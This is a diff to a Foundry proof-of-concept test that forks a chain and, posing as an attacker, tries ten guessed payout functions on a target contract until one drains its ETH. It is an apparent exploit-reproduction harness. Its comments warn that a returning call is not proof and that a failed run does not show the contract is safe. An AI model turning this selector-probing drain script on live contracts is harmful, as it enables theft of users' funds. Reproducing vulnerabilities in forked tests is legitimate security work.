@@ -29,6 +29,56 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
+    /// Try each plausible entry point and accept the first that changes the
+    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
+    /// function returns successfully and changes nothing, so judging by the call
+    /// result reports "not reproduced" for a vulnerability that exists under
+    /// another name.
+    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
+        internal
+        returns (string memory)
+    {
+        vm.prank(attacker);
+        (bool ok,) = target.call(data);
+        console.log("tried", label, ok ? "call returned" : "call reverted");
+        if (ok && target.balance < before) return label;
+        return "";
+    }
+
+    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
+        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "drain()", abi.encodeWithSignature("drain()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "withdrawAll()", abi.encodeWithSignature("withdrawAll()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "sweep()", abi.encodeWithSignature("sweep()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "withdraw(address)",
+            abi.encodeWithSignature("withdraw(address)", attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "withdrawTo(address)",
+            abi.encodeWithSignature("withdrawTo(address)", attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "collect()", abi.encodeWithSignature("collect()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "payout()", abi.encodeWithSignature("payout()"));
+        if (bytes(used).length > 0) return used;
+        used = _attempt(attacker, before, "release()", abi.encodeWithSignature("release()"));
+        if (bytes(used).length > 0) return used;
+        return "";
+    }
+
     function test_exploit() public {
         address attackerEOA = makeAddr("attacker");
         vm.deal(attackerEOA, 1 ether);
@@ -36,25 +86,17 @@ contract PoC is Test {
         uint256 targetBefore = target.balance;
         require(targetBefore > 0, "target holds no ETH to drain");
 
-        // TODO: narrow to the target's real payout function if known.
-        bytes[] memory candidates = new bytes[](4);
-        candidates[0] = abi.encodeWithSignature("withdraw()");
-        candidates[1] = abi.encodeWithSignature("claim()");
-        candidates[2] = abi.encodeWithSignature("drain()");
-        candidates[3] = abi.encodeWithSignature("withdrawAll()");
+        uint256 before = target.balance;
+        string memory used = _tryEntry(attackerEOA, before);
+        console.log("entry point that changed state:", used);
 
-        bool drained = false;
-        for (uint256 i = 0; i < candidates.length; i++) {
-            vm.prank(attackerEOA);
-            (bool ok,) = target.call(candidates[i]);
-            if (ok && target.balance < targetBefore) {
-                drained = true;
-                console.log("drained via candidate index:", i);
-                break;
-            }
-        }
+        uint256 drained = targetBefore - target.balance;
         console.log("target balance before:", targetBefore);
         console.log("target balance after:", target.balance);
-        assertTrue(drained, "exploit did not reproduce: no payout selector drained funds");
+        assertGt(
+            drained,
+            0,
+            "no payout selector moved ETH out of the target. Tried withdraw(), claim(), drain(), withdrawAll(), sweep(), withdraw(address), withdrawTo(address), collect(), payout(), release(). This does NOT establish safety: the payout may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
+        );
     }
 }
